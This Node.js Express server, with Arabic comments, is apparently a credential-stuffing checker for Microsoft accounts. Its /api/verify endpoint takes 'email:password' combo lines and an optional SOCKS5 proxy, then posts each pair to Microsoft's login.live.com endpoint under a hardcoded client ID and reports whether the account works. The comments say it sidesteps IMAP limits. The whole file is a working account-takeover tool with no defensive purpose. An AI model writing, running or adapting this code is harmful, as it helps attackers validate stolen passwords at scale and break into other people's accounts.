const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios'); // سنستخدم axios بدلاً من imap لقوة الفحص
const { SocksProxyAgent } = require('socks-proxy-agent');
const app = express();

app.use(cors());
app.use(express.json());

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/verify', async (req, res) => {
    const { account, proxy } = req.body;
    if (!account || !account.includes(':')) return res.status(400).json({ status: 'FAILED' });

    const [email, password] = account.split(':');
    
    // إعداد الوكيل (Proxy) إذا وجد
    const axiosConfig = {
        timeout: 15000,
        validateStatus: false
    };

    if (proxy && proxy.includes(':')) {
        axiosConfig.httpsAgent = new SocksProxyAgent(`socks5://${proxy.trim()}`);
    }

    try {
        // محاكاة محاولة تسجيل دخول حقيقية عبر نقطة اتصال مايكروسوفت
        // هذه الطريقة تتخطى قيود IMAP وتفحص إذا كان الحساب شغالاً برمجياً
        const response = await axios.post('https://login.live.com/oauth20_authorize.srf', 
            new URLSearchParams({
                'client_id': '000000004C12AE29', // Microsoft SDK ID
                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
                'response_type': 'token',
                'scope': 'service::user.read::ABI',
                'login_hint': email,
                'username': email,
                'password': password,
                'grant_type': 'password'
            }).toString(), axiosConfig);

        const body = JSON.stringify(response.data);
        
        // إذا استجاب السيرفر بوجود خطأ في كلمة المرور أو الحساب
        if (body.includes('error_description') || body.includes('LCID')) {
            return res.json({ status: 'FAILED' });
        }

        // إذا نجح في الوصول أو طلب توثيق إضافي (يعني الحساب شغال)
        res.json({ status: 'SUCCESS' });

    } catch (e) {
        // في حال فشل البروكسي أو الاتصال
        res.json({ status: 'FAILED', reason: 'Connection Error' });
    }
});

module.exports = app;
